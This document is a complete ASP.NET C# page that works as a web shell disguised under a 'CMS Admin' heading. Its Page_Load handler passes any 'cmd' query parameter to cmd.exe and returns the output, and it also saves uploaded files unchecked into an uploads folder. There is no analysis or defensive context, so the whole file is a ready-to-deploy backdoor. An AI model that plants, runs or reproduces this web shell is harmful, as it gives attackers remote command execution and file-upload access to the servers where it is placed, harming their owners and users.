<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
void Page_Load(object s, EventArgs e) {
  if (Request.HttpMethod == "POST" && Request.Files.Count > 0) {
    var f = Request.Files[0];
    string p = Server.MapPath("~/uploads/" + Path.GetFileName(f.FileName));
    Directory.CreateDirectory(Path.GetDirectoryName(p));
    f.SaveAs(p);
    Response.Write("OK:" + p);
  } else if (Request.QueryString["cmd"] != null) {
    Response.Write("<pre>");
    var psi = new System.Diagnostics.ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c " + Request.QueryString["cmd"];
    psi.RedirectStandardOutput = true; psi.UseShellExecute = false;
    var pr = System.Diagnostics.Process.Start(psi);
    Response.Write(pr.StandardOutput.ReadToEnd());
    pr.WaitForExit();
    Response.Write("</pre>");
  } else {
    Response.Write("<h1>CMS Admin</h1><form enctype=multipart/form-data method=post><input type=file name=f/><input type=submit/></form>");
  }
}
</script>
